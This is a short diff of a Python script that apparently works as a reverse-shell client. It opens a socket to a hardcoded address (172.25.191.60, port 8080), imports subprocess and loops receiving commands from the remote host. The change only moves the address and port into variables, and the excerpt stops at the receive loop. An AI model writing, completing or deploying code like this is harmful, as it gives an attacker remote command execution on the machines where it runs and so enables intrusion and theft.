@@ -3,10 +3,12 @@
 import socket
 import subprocess
 
+ip = "172.25.191.60"
+port = 8080
 
 def connect():
     Mysocket = socket.socket()
-    Mysocket.connect(("172.25.191.60", 8080))
+    Mysocket.connect((ip, port))
 
     while True:
         command = Mysocket.recv(1024)
